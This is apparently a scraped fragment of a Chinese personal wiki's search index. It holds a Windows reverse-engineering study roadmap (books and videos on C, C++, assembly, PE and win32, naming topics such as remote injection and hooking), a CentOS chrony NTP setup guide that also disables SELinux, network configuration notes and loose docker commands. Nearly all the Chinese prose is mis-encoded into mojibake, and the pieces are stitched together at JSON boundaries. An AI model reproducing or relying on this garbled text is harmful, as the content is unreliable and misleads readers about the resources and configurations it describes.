è·¯çº¿æ˜¯ä¸ä¸€æ ·çš„ï¼ŒçŸ¥è¯†æ˜¯ç½‘çŠ¶çš„ï¼Œå­¦ä¹ è·¯çº¿æˆé•¿è·¯çº¿æ˜¯ä¸åŒçš„ã€‚ä½†å¦‚æœä½ æƒ³å­¦ä¹ æŸæ–¹é¢çš„çŸ¥è¯†ï¼Œæœ¬æ–‡æ˜¯ä¸€äº›ç›¸åº”å¯ä¾›å‚è€ƒçš„å­¦ä¹ èµ„æºï¼Œå¦‚è§†é¢‘ï¼Œä¹¦ç±ç­‰ã€‚ä¸åœ¨æœ¬æ–‡é‡Œçš„èµ„æºä¸ä»£è¡¨ä¸å¥½ï¼Œåªæ˜¯ä¿ºæ²¡ä½¿ç”¨è¿‡ åŸºç¡€ Cè¯­è¨€ å¦‚æœæœªæ¥æƒ³åœ¨è®¡ç®—æœºé¢†åŸŸæœ‰é•¿è¶³çš„å‘å±•ï¼ŒCè¯­è¨€æ˜¯ä¸€é—¨å¿…é¡»æŒæ¡å¥½çš„è¯­è¨€ï¼Œæ›´ä½•å†µåšé€†å‘ç ”ç©¶ã€‚åŸºç¡€æ•°æ®ç±»å‹ï¼Œåˆ†æ”¯å¾ªç¯ç»“æ„ä½“è¿™äº›è¯­æ³•å…¶å®æ˜¯å¾ˆç®€å•çš„ï¼Œæœ‰äº›ç¼–ç¨‹æ€ç»´å°±èƒ½å¾ˆå¿«æŒæ¡ã€‚æŒ‡é’ˆæ‰æ˜¯é‡ç‚¹å’Œçµé­‚ï¼ŒæŒ‡é’ˆå¯ä»¥å‚è€ƒæ»´æ°´ä¸‰æœŸè§†é¢‘è®²è§£æŒ‡é’ˆçš„éƒ¨åˆ†è¿›è¡Œå­¦ä¹ ã€‚ è§†é¢‘ï¼šæ»´æ°´ä¸‰æœŸ ä¹¦ç±ğŸ“•ï¼š ä¹¦å ä½œè€…æ˜¯å›½å†…/å›½å¤– å‡ºç‰ˆå¹´ åŸç‰ˆorä¸­æ–‡ å¤‡æ³¨ C Primer Plus ç¬¬6ç‰ˆ ä¸­æ–‡ç‰ˆ å›½å¤– 2020å¹´ ä¸­æ–‡ç‰ˆå°±å¯ä»¥äº†ï¼Œä¸å¿…è¿½æ±‚åŸç‰ˆã€‚ C++ æœ‰äº†Cè¯­è¨€ï¼Œå…¶å®å°±å¯ä»¥åšå¾ˆå¤šäº‹ï¼Œä½†å­¦äº†C++ï¼Œå†™ä»£ç ä¼šæ›´çœåŠ›æ–¹ä¾¿å¿«æ·ã€‚C++æä¾›äº†å¾ˆå¤šå¸®åŠ©å¼€å‘è€…å¿«é€Ÿå¼€å‘çš„è¯­æ³•ï¼šç»§æ‰¿ã€å¤šæ€ã€æ¨¡æ¿ã€STLç­‰ã€‚ æ³¨ï¼šè®°å¾—å­¦ä¹ ç›®çš„ï¼Œå­¦C++å¾ˆå®¹æ˜“é™·è¿›å»ï¼Œæ— è®ºå¤šå°‘æ—¶é—´éƒ½ä¼šè¢«è€—è¿›å»ï¼Œä»¥å®ç”¨ä¸ºå‡†ï¼Œå†·é—¨çš„çŸ¥è¯†ç‚¹ç”¨æ—¶å†æŸ¥ã€‚ è§†é¢‘ï¼šæ»´æ°´ä¸‰æœŸ ä¹¦ç±ğŸ“•ï¼š ä¹¦å ä½œè€…æ˜¯å›½å†…/å›½å¤– å‡ºç‰ˆå¹´ åŸç‰ˆorä¸­æ–‡ å¤‡æ³¨ Thinking in C++ å›½å¤– 2000å¹´ æ¨èåŸç‰ˆï¼Œä¸­æ–‡æœ‰äº›åœ°æ–¹ç¿»è¯‘ä¸å’‹åœ°ï¼Œä½†æ˜¯çœ‹åŸæ–‡å…¶å®å¾ˆæ¸…æ™° é€‚åˆæŒæ¡ä¸€å®šC++è¯­æ³•åçœ‹ï¼Œä¼šè®²è¯­æ³•èƒŒåçš„è®¾è®¡ã€åŸç†ã€‚æµ™å¤§ç¿æºè€å¸ˆåœ¨ç½‘æ˜“äº‘è¯¾å ‚çš„é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡-C++è§†é¢‘å¯ä¾›å‚è€ƒï¼Œä½†ç›¸æ¯”äºä¹¦çŸ¥è¯†ç‚¹å°‘å¾ˆå¤šã€‚ ç¼–ç¨‹è§„èŒƒï¼šC++ Core Guidelines æºç å±•å¼€ï¼šhttps://cppinsights.io/ çœ‹åæ±‡ç¼–ï¼Œçœ‹ä¸­é—´æ–‡ä»¶ï¼šhttps://godbolt.org/ æ±‡ç¼–è¯­è¨€ ä¿ºä¹‹å‰å­¦ä¹ è¿‡ç¨‹æ˜¯å…ˆçœ‹äº†ç‹çˆ½è€å¸ˆçš„ã€Šæ±‡ç¼–è¯­è¨€ã€‹ï¼Œç„¶åæ˜¯é»‘çš®ä¹¦æ±‡ç¼–è¯­è¨€7thï¼Œå°†è¯¾åä¹ é¢˜å‡ ä¹éƒ½åšäº†ï¼Œå¯¹æ±‡ç¼–è¯­è¨€æŒæ¡å¾—å¾ˆæ¸…æ™°ã€‚å¯¼è‡´åé¢çœ‹çš„æ»´æ°´ä¸‰æœŸæ±‡ç¼–çš„éƒ¨åˆ†å‡ ä¹æ²¡ä»€ä¹ˆæ–°çš„ä½“ä¼šã€‚ è§†é¢‘ï¼šæ»´æ°´ä¸‰æœŸ ä¹¦ç±ğŸ“•ï¼š ä¹¦å ä½œè€…æ˜¯å›½å†…/å›½å¤– å‡ºç‰ˆå¹´ åŸç‰ˆorä¸­æ–‡ å¤‡æ³¨ æ±‡ç¼–è¯­è¨€ï¼ˆç¬¬4ç‰ˆï¼‰ å›½å†… 2020å¹´ - ç»å…¸æ•™æï¼Œè®²å¾—æµ…æ˜¾æ˜“æ‡‚ æ±‡ç¼–è¯­è¨€ï¼šåŸºäºx86å¤„ç†å™¨ï¼ˆåŸä¹¦ç¬¬7ç‰ˆï¼‰ å›½å¤– 2016å¹´ ä¸­æ–‡å³å¯ ç°åœ¨ä¸­æ–‡æœ‰ç¬¬å…«ç‰ˆäº† PE å¯æ‰§è¡Œæ–‡ä»¶å­˜æ”¾çš„æ•°æ®æ ¼å¼å’Œçº¦å®šã€‚ è§†é¢‘ï¼šæ»´æ°´ä¸‰æœŸ ä¹¦ç±ğŸ“•ï¼š ä¹¦å ä½œè€…æ˜¯å›½å†…/å›½å¤– å‡ºç‰ˆå¹´ åŸç‰ˆorä¸­æ–‡ å¤‡æ³¨ ã€ŠåŠ å¯†ä¸è§£å¯†ã€‹3thï¼ŒPEç« èŠ‚ PEæƒå¨æŒ‡å— ä»£ç æ˜¯win32æ±‡ç¼–å†™çš„ï¼Œä½†å¯¹PEå„ç§è®²è§£å¾ˆå…¨ C++é»‘å®¢ç¼–ç¨‹è§£å¯†ï¼ŒPEç« èŠ‚ windows apiç¼–ç¨‹ æƒ³åœ¨windowså¹³å°ä¸‹å¼€å‘ç¨‹åºçš„ï¼Œwin32å¿…å­¦ã€‚å¯¹äºæƒ³ç ”ç©¶windowså†…æ ¸ï¼Œæƒ³èµ°é€†å‘ç ”ç©¶çš„ï¼Œæ›´æ˜¯è¦ç²¾é€šwin32ã€‚çœ‹çŸ¥ä¹è¯´è¿‡æ—¶äº†æ²¡äººç”¨äº†ï¼Œæ›´ç§°MFCæ˜¯â€œæ²¡é¥­åƒâ€ï¼Œç”»ç•Œé¢åªæ˜¯win32çš„ä¸€éƒ¨åˆ†åŠŸèƒ½ã€‚win32åŒ…æ‹¬ä»¥ä¸‹çŸ¥è¯†ï¼š å­—ç¬¦ å¤šçº¿ç¨‹ï¼Œçº¿ç¨‹åŒæ­¥ çª—å£ï¼Œwindowsæ¶ˆæ¯æœºåˆ¶ï¼Œå­çª—å£çš„ä½¿ç”¨ è¿›ç¨‹ å†…å­˜ç®¡ç† æ–‡ä»¶ç³»ç»Ÿ å†…å­˜æ˜ å°„ DLL è¿œç¨‹æ³¨å…¥ æ¨¡å—éšè— è¿›ç¨‹é€šä¿¡ HOOKï¼ˆå„ç§ç±»å‹HOOK/ç»•è¿‡å…¨ä»£ç æ ¡éªŒç­‰ï¼‰ åƒè¿›ç¨‹ï¼Œå†…å­˜è¿™äº›æ›´æ˜¯ç ”ç©¶æ“ä½œç³»ç»Ÿçš„åŸºç¡€ã€‚ å­¦ä¹ Windows APIçª—å£ç¼–ç¨‹çš„ä¸»è¦ç›®çš„æ˜¯æŒæ¡æ¶ˆæ¯æœºåˆ¶ã€‚è¿™åŒ…æ‹¬äº†è§£æ¶ˆæ¯æ˜¯å¦‚ä½•ç”Ÿæˆå’Œå¤„ç†çš„ã€‚ä¸€æ—¦ç†è§£äº†è¿™ä¸€ç‚¹ï¼Œå‰©ä¸‹çš„ä¸»è¦å°±æ˜¯æŸ¥è¯¢æ–‡æ¡£ã€‚è™½ç„¶åŸç”Ÿçš„Windowsçª—å£ç¼–ç¨‹åœ¨å®é™…å¼€å‘ä¸­å¯èƒ½ä¸å¤Ÿç¾è§‚ï¼Œä¹Ÿä¸å¸¸ç”¨ï¼Œä½†å®ƒå¯¹äºç†è§£æ¶ˆæ¯æœºåˆ¶ä»ç„¶å¾ˆé‡è¦ã€‚è¿™ç§ç†è§£å¯¹äºå­¦ä¹ æ›´é«˜çº§çš„æ¡†æ¶MFCï¼Œæ˜¯éå¸¸æœ‰å¸®åŠ©çš„ã€‚ è§†é¢‘ï¼šæ»´æ°´ä¸‰æœŸ ä¹¦ç±ğŸ“•ï¼ˆå¼€å‘æ—¶æŸ¥é˜…ä½¿ç”¨ï¼‰ï¼š ä¹¦å ä½œè€…æ˜¯å›½å†…/å›½å¤– å‡ºç‰ˆå¹´ åŸç‰ˆorä¸­æ–‡ å¤‡æ³¨ æ·±å…¥æµ…å‡ºWindows APIç¨‹åºè®¾è®¡ ç¼–ç¨‹åŸºç¡€ç¯‡ å›½å†… 2022å¹´? - è®²GUIç•Œé¢çš„ æ·±å…¥æµ…å‡ºWindows APIç¨‹åºè®¾è®¡ï¼šæ ¸å¿ƒç¼–ç¨‹ç¯‡ å›½å†… 2022å¹´ - kernel32é‡Œçš„é‚£äº›api Windows APIå¼€å‘è¯¦è§£ å›½å†… 2011å¹´ - æ–‡æ¡£ğŸ“šï¼šMSDN ç¡¬ç¼–ç  è§†é¢‘ï¼šæ»´æ°´ä¸‰æœŸ å·¥å…·ä¹¦ï¼š ä¹¦å ä¿—ç§° å¦‚ä½•ä¸‹è½½ å¤‡æ³¨ IntelÂ® 64 and IA-32 Architectures Software Developerâ€™s Manual Volume 2 (2A, 2B, 2C, &amp; 2D): Instruction Set Reference, A-Z intelç™½çš®ä¹¦äºŒå· googleæœï¼Œå®˜ç½‘æœ‰ä¸‹è½½é“¾æ¥ æ±‡ç¼–æŒ‡ä»¤å’Œç¡¬ç¼–ç æŸ¥é˜…å·¥å…·ä¹¦ ä¸­çº§ ä¿æŠ¤æ¨¡å¼ è§†é¢‘ï¼šæ»´æ°´æµ·å“¥ä¸­çº§ç‰ˆï¼ˆç½‘ä¸Šæ‰¾ï¼Œç½‘ç›˜èµ„æºï¼‰ å‚è€ƒä¹¦ç±ğŸ“•ï¼š ä¹¦å ä½œè€…æ˜¯å›½å†…/å›½å¤– å‡ºç‰ˆå¹´ åŸç‰ˆorä¸­æ–‡ å¤‡æ³¨ x86æ±‡ç¼–è¯­è¨€ï¼ˆç¬¬2ç‰ˆï¼‰ å›½å†… 2023å¹´ - ä¸ŠåŠç« å®æ¨¡å¼çœ‹è¿‡ç‹çˆ½è€å¸ˆçš„æ±‡ç¼–è¯­è¨€çš„è¯ï¼Œå¯ä»¥å¾ˆå¿«ç¿»è¿‡å»ï¼›ä¸‹åŠç« å¯ä»¥çœ‹æ˜¯ç™½çš®ä¹¦çš„ç¿»è¯‘+è§è§£ã€‚è¿™æœ¬ä¹¦ä¿ºåªç¿»è¿‡ï¼Œå…·ä½“å¦‚ä½•æ²¡æ³•è¯„ä»·ï¼Œä¸è¿‡ç¡®å®æ˜¯å›½å†…ä¿æŠ¤æ¨¡å¼å°‘æ•°èƒ½å‚è€ƒçš„ä¹¦ç±äº†ã€‚ å·¥å…·ä¹¦ï¼š ä¹¦å ä¿—ç§° å¦‚ä½•ä¸‹è½½ å¤‡æ³¨ IntelÂ® 64 and IA-32 ArchitecturesSoftware Developerâ€™s ManualVolume 3 (3A, 3B, 3C, &amp; 3D):System Programming Guide intelç™½çš®ä¹¦ä¸‰å· googleæœï¼Œå®˜ç½‘æœ‰ä¸‹è½½é“¾æ¥ æ®µé¡µæœºåˆ¶"},{"title":"chronyæ—¶é—´æœåŠ¡å™¨","path":"/wiki/linux_env/chronyæ—¶é—´æœåŠ¡å™¨.html","content":"å‰è¨€ æœ‰å°linuxéœ€è¦åšæ—¶é—´åŒæ­¥ï¼Œä½†æ— æ³•è¿å¤–ç½‘ï¼Œåªèƒ½æ­ä¸ªå†…ç½‘NTPæœåŠ¡å™¨ï¼Œè®©å®ƒä¸å†…ç½‘NTPæœåŠ¡å™¨åšæ—¶é—´åŒæ­¥ã€‚ å¦‚æœèƒ½è¿ç½‘ï¼Œé…ç½®æ–‡ä»¶ä¸­æœ¬èº«æœ‰é»˜è®¤çš„æ—¶é—´æºï¼Œä¹Ÿå¯ä»¥è‡ªå·±æ”¹ã€‚ æ–‡ç« ç¯å¢ƒ centos 1234[root@localhost squid]# cat /etc/redhat-releaseCentOS Linux release 7.9.2009 (Core)[root@localhost user]# uname -aLinux localhost.localdomain 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux ä»‹ç» Chronyæœ‰ä¸¤ä¸ªæ ¸å¿ƒç»„ä»¶ï¼Œåˆ†åˆ«æ˜¯ï¼š chronydï¼šæ˜¯å®ˆæŠ¤è¿›ç¨‹ï¼Œä¸»è¦ç”¨äºè°ƒæ•´å†…æ ¸ä¸­è¿è¡Œçš„ç³»ç»Ÿæ—¶é—´å’Œæ—¶é—´æœåŠ¡å™¨åŒæ­¥ã€‚å®ƒç¡®å®šè®¡ç®—æœºå¢å‡æ—¶é—´çš„æ¯”ç‡ï¼Œå¹¶å¯¹æ­¤è¿›è¡Œè°ƒæ•´è¡¥å¿ chronycï¼šæä¾›ä¸€ä¸ªç”¨æˆ·ç•Œé¢ï¼Œç”¨äºç›‘æ§æ€§èƒ½å¹¶è¿›è¡Œå¤šæ ·åŒ–çš„é…ç½®ã€‚å®ƒå¯ä»¥åœ¨chronydå®ä¾‹æ§åˆ¶çš„è®¡ç®—æœºä¸Šå·¥ä½œï¼Œä¹Ÿå¯ä»¥åœ¨ä¸€å°ä¸åŒçš„è¿œç¨‹è®¡ç®—æœºä¸Šå·¥ä½œã€‚ chronyå®‰è£… ç³»ç»Ÿå·²é»˜è®¤å®‰è£…ã€‚ 1yum install chrony -y å¯åŠ¨å¹¶åŠ å…¥å¼€æœºè‡ªå¯åŠ¨ã€‚ 123systemctl enable chronyd.servicesystemctl restart chronyd.servicesystemctl status chronyd.service é˜²ç«å¢™è®¾ç½® 12firewall-cmd --add-service=ntp --permanentfirewall-cmd --reload å› NTPä½¿ç”¨123/UDPç«¯å£åè®®ï¼Œæ‰€ä»¥å…è®¸NTPæœåŠ¡å³å¯ã€‚ å…³é—­SELinux ä¸´æ—¶å…³é—­ 1setenforce 0 æ°¸ä¹…å…³é—­ ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/selinux/config,å°†å…¶ä¸­SELINUXè®¾ç½®ä¸ºdisabled 12- SELINUX=enforcing + SELINUX=disabled é‡å¯ç”Ÿæ•ˆï¼Œä½¿ç”¨sestatusæŸ¥çœ‹SELinuxçŠ¶æ€ é»˜è®¤é…ç½®æ–‡ä»¶åŠè§£è¯» 1cat /etc/chrony.conf åŸç‰ˆæ³¨é‡Šç‰ˆ123456789101112131415161718192021222324252627282930313233343536373839# These servers were defined in the installation:server 0.centos.pool.ntp.org iburstserver 1.centos.pool.ntp.org iburstserver 2.centos.pool.ntp.org iburstserver 3.centos.pool.ntp.org iburst# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics tracking1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# ä½¿ç”¨pool.ntp.orgé¡¹ç›®ä¸­çš„å…¬å…±æœåŠ¡å™¨ã€‚ä»¥serverå¼€å¤´ï¼Œç†è®ºä¸Šä½ æƒ³æ·»åŠ å¤šå°‘æ—¶é—´æœåŠ¡å™¨éƒ½å¯ä»¥ã€‚# These servers were defined in the installation:server 0.centos.pool.ntp.org iburstserver 1.centos.pool.ntp.org iburstserver 2.centos.pool.ntp.org iburstserver 3.centos.pool.ntp.org iburst# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).# æ ¹æ®å®é™…æ—¶é—´è®¡ç®—å‡ºæœåŠ¡å™¨å¢å‡æ—¶é—´çš„æ¯”ç‡ï¼Œç„¶åè®°å½•åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ç³»ç»Ÿé‡å¯åä¸ºç³»ç»Ÿåšå‡ºæœ€ä½³æ—¶é—´è¡¥å¿è°ƒæ•´ã€‚# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# chronydæ ¹æ®éœ€æ±‚å‡æ…¢æˆ–åŠ é€Ÿæ—¶é—´è°ƒæ•´ï¼Œ# åœ¨æŸäº›æƒ…å†µä¸‹ç³»ç»Ÿæ—¶é’Ÿå¯èƒ½æ¼‚ç§»è¿‡å¿«ï¼Œå¯¼è‡´æ—¶é—´è°ƒæ•´ç”¨æ—¶è¿‡é•¿ã€‚# è¯¥æŒ‡ä»¤å¼ºåˆ¶chronydè°ƒæ•´æ—¶æœŸï¼Œå¤§äºæŸä¸ªé˜€å€¼æ—¶æ­¥è¿›è°ƒæ•´ç³»ç»Ÿæ—¶é’Ÿã€‚# åªæœ‰åœ¨å› chronydå¯åŠ¨æ—¶é—´è¶…è¿‡æŒ‡å®šçš„é™åˆ¶æ—¶ï¼ˆå¯ä½¿ç”¨è´Ÿå€¼æ¥ç¦ç”¨é™åˆ¶ï¼‰æ²¡æœ‰æ›´å¤šæ—¶é’Ÿæ›´æ–°æ—¶æ‰ç”Ÿæ•ˆã€‚# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# å°†å¯ç”¨ä¸€ä¸ªå†…æ ¸æ¨¡å¼ï¼Œåœ¨è¯¥æ¨¡å¼ä¸­ï¼Œç³»ç»Ÿæ—¶é—´æ¯11åˆ†é’Ÿä¼šæ‹·è´åˆ°å®æ—¶æ—¶é’Ÿï¼ˆRTCï¼‰ã€‚# Enable kernel synchronization of the real-time clock (RTC).rtcsync# é€šè¿‡ä½¿ç”¨hwtimestampæŒ‡ä»¤å¯ç”¨ç¡¬ä»¶æ—¶é—´æˆ³# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# æŒ‡å®šä¸€å°ä¸»æœºã€å­ç½‘ï¼Œæˆ–è€…ç½‘ç»œä»¥å…è®¸æˆ–æ‹’ç»NTPè¿æ¥åˆ°æ‰®æ¼”æ—¶é’ŸæœåŠ¡å™¨çš„æœºå™¨# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.# æŒ‡å®šåŒ…å«NTPéªŒè¯å¯†é’¥çš„æ–‡ä»¶ã€‚# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# æŒ‡å®šæ—¥å¿—æ–‡ä»¶çš„ç›®å½•ã€‚# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics tracking ä¸€ä¸ªä¾‹å­ ä¿®æ”¹é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š 1vi /etc/chrony.conf æ³¨é‡Šæ‰å¤–éƒ¨æ—¶é’Ÿï¼Œå› ä¸ºå†…ç½‘ç¯å¢ƒï¼Œä¸Šä¸äº†ç½‘ã€‚å¢åŠ è‡ªèº«ipä½œä¸ºæ—¶é’ŸæœåŠ¡å™¨ã€‚ allowå‘½ä»¤æŒ‡å…è®¸å“ªäº›ipé€šè¿‡è®¿é—®åˆ°è‡ªå·±ã€‚ local stratum 10æŒ‡å½“å¤–éƒ¨æ—¶é’Ÿè®¿é—®ä¸åˆ°æ—¶ï¼Œå…è®¸è‡ªèº«ä½œä¸ºæ—¶é’ŸæœåŠ¡å™¨æ¥æ ¡å‡†å®¢æˆ·ç«¯ 123456789101112131415161718192021222324252627282930313233343536373839404142# These servers were defined in the installation:+ #server 0.centos.pool.ntp.org iburst+ #server 1.centos.pool.ntp.org iburst+ #server 2.centos.pool.ntp.org iburst+ #server 3.centos.pool.ntp.org iburst+ server 192.168.147.201 iburst# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16+ allow 192.168.147.0/24 # Serve time even if not synchronized to a time source.+ local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics tracking é‡å¯chrony 1systemctl restart chronyd.service å¤–ç½‘çš„è¯ï¼Œå¯ä»¥æ³¨é‡Šæ‰é‚£å››ä¸ªserverï¼Œç„¶ååŠ ä¸ªé˜¿é‡Œäº‘çš„æ—¶é—´æºserver ntp.aliyun.com iburstï¼Œå…¶ä½™æ­¥éª¤ä¸€æ · å®¢æˆ·ç«¯ä½¿ç”¨æ•ˆæœ ä¿®æ”¹é…ç½®æ–‡ä»¶ 1vi /etc/chrony.conf æ³¨é‡Šæ‰4ä¸ªå¤–éƒ¨æ—¶é’Ÿï¼Œæ·»åŠ 192.168.147.201ä½œä¸ºæ—¶é’Ÿ 123456789101112131415161718192021222324252627282930313233343536373839# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).+ #server 0.centos.pool.ntp.org iburst+ #server 1.centos.pool.ntp.org iburst+ #server 2.centos.pool.ntp.org iburst+ #server 3.centos.pool.ntp.org iburst+ server 192.168.147.201 iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics trackin é‡å¯chrony 1systemctl restart chronyd.service ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹åŒæ­¥çŠ¶æ€ï¼Œå…¶ä¸­â€œ^*â€ ä»£è¡¨æ—¶é—´å·²ç»æ­£ç¡®åŒæ­¥ 1chronyc sources -v å‚è€ƒ è¯¦è§£ï¼šLinux Chrony è®¾ç½®æœåŠ¡å™¨é›†ç¾¤åŒæ­¥æ—¶é—´"},{"title":"å‰è¨€","path":"/wiki/cybersecurity_learning/å‰è¨€_å®‰å…¨æŠ€æœ¯å­¦ä¹ å¿ƒå¾—.html","content":"å‰è¨€ æƒ³èµ·ä»¥å‰åœ¨æ ¡æ—¶å­¦ä¹ é€†å‘æ—¶é‡åˆ°çš„å›°éš¾ï¼šèº«è¾¹äººå­¦è¿™ä¸ªçš„å¤ªå°‘ï¼Œå¯ä¾›å‚è€ƒçš„èµ„æ–™å¤ªå°‘ï¼ˆä¹¦ç±ç»ç‰ˆï¼Œç½‘ä¸Šæ–‡ç« è‰¯è ä¸é½ï¼‰ã€‚ç°åœ¨å·²ç»è¿‡äº†é‚£ä¸ªé˜¶æ®µï¼Œå¯¹å®‰å…¨æŠ€æœ¯æœ‰äº†ç¨å¾®æ¸…æ™°ç‚¹çš„è®¤çŸ¥ï¼Œé‚æƒ³èµ·ä¸€æ ï¼Œå†™ä¸‹ä¸€äº›å­¦ä¹ çš„å¿ƒå¾—ï¼Œè¿˜æœ‰è®°å½•ä¸€äº›å­¦ä¹ èµ„æºï¼Œä¸€æ˜¯ä¾›åæ¥è€…å‚è€ƒï¼ŒäºŒæ˜¯ä¾›è‡ªå·±å‚è€ƒå¤ç›˜ã€‚ å…³äºæ ‡é¢˜ï¼Œæœ¬æ¥æ˜¯æƒ³å«é€†å‘å­¦ä¹ å¿ƒå¾—çš„ï¼Œä½†å®é™…ä¸Šï¼Œä¿ºå·²ç»è¿‡äº†è¿™ä¸ªå¿ƒç»“ï¼ˆåé¢ä¼šæåˆ°ï¼‰ã€‚çŸ¥è¯†æ˜¯ç½‘çŠ¶çš„ï¼Œå¾ˆå¤šæŠ€æœ¯æ˜¯æœ‰å…±é€šä¹‹å¤„ï¼Œä¸æ˜¯è¯´å­¦é€†å‘å°±ä¸ç”¨å­¦å…¶ä»–çš„ï¼Œæœ€åè¿˜æ˜¯å†³å®šèµ·åä¸ºå®‰å…¨æŠ€æœ¯å­¦ä¹ å¿ƒå¾—ã€‚ä½†è¿™ä¸ªwikié‡Œä¸»è¦è®²çš„è¿˜æ˜¯é€†å‘ï¼Œæˆ–è€…è¯´äºŒè¿›åˆ¶å®‰å…¨æ–¹é¢çš„ï¼Œæ³¨æ„æ˜¯windowsæ–¹é¢çš„ã€‚ æ›´æ–°è®°å½• ä¹¦ç±ã€èµ„æ–™ã€æŠ€æœ¯ä¼šæ›´æ–°ï¼Œåƒ2021å¹´å·¦å³00å¹´å·¦å³çš„ä¹¦ç±å‡ ä¹ç»ç‰ˆäº†ï¼Œä½†å…¶å®ä»æ˜¯æœ‰æå¤§å‚è€ƒä»·å€¼çš„ã€‚è¿™é‡Œåˆ—å‡ºæ—¶é—´çº¿ï¼Œæ–¹ä¾¿å‚è€ƒ 2024 å¹´ 3 æœˆ 7 æ—¥æ–°å»ºå®‰å…¨æŠ€æœ¯å­¦ä¹ å¿ƒå¾—çš„wikiï¼Œå†™äº†å‰è¨€å’Œå­¦ä¹ è·¯çº¿åŠèµ„æºä¸¤ä¸ªmd"},{"title":"Linux","path":"/wiki/essentials_os_tools/Linux.html","content":"ç½‘ç»œç›¸å…³ é™æ€IP CentOSUbuntuç½‘å¡é…ç½®æ–‡ä»¶åœ¨/etc/sysconfig/network-scriptsä¸‹ 1cd /etc/sysconfig/network-scripts ä¾‹ï¼Œens33æ˜¯ç½‘å¡å1vi ifcfg-ens33 é…ç½®æ–‡ä»¶ä¾‹1234567891011121314151617181920TYPE=EthernetPROXY_METHOD=noneBROWSER_ONLY=noBOOTPROTO=staticDEFROUTE=yesIPV4_FAILURE_FATAL=noIPV6INIT=yesIPV6_AUTOCONF=yesIPV6_DEFROUTE=yesIPV6_FAILURE_FATAL=noNAME=ens33#UUID=918aeb73-c766-4e4d-b882-fccefe3fae07#DEVICE=eth0ONBOOT=yesHWADDR=00:0c:29:45:ca:1e#IPADDR=192.168.92.124#GATEWAY=192.168.92.1IPADDR=192.168.147.161GATEWAY=192.168.147.1NETMASK=255.255.255.0 ä¿®æ”¹åï¼Œé‡å¯ç½‘å¡æˆ–é‡å¯ç½‘ç»œ é‡å¯ç½‘å¡1sudo ifdown ens33 &amp;&amp; sudo ifup ens33 é‡å¯ç½‘ç»œ1sudo systemctl restart networkå¾…è¡¥å…… dockerç›¸å…³ å¾…æ•´ç†12345678910111213141516171819202122232425262728293031systemctl start dockeræ£€æŸ¥IPåœ°å€å’Œç«¯å£è½¬å‘docker inspect graybox-java-webserver --format &#x27;&#123;&#123; .NetworkSettings.Ports &#125;&#125;&#x27;docker inspect graybox-java-webserver --format &#x27;&#123;&#123; .NetworkSettings.IPAddress &#125;&#125;&#x27;docker start phpenvfirewall-cmd --list-allè¿›å…¥å®¹å™¨å†…éƒ¨ï¼Œç›´æ¥ç”¨curlæ£€æŸ¥WebæœåŠ¡æ˜¯å¦åœ¨å†…éƒ¨æ­£å¸¸å·¥ä½œdocker exec -it graybox-java-webserver curl http://localhost:80docker inspect phpenvdocker logs phpenvdocker exec phpenv ps auxdocker exec phpenv envdocker restart graybox-java-webserverfind / -type f -name &quot;install.sh&quot;docker exec -it IDåç§° /bin/bashnetstat -tulnp | grep :80docker exec -it graybox-java-webserver bashnetstat -tulpn | grep :80"},{"title":"PE Tools","path":"/wiki/essentials_os_tools/PE_Tools.html","content":"æŸ¥çœ‹dllä¸­å¯¼å‡ºçš„å‡½æ•° Dependency Walker æ³¨ï¼šåªæ”¯æŒWindows 95, 98, Me, NT, 2000, XP, 2003, Vista, 7, and 8ä¸‹32/64ä½æ¨¡å—çš„åˆ†æï¼Œ2006å¹´åå·²åœæ­¢æ›´æ–° 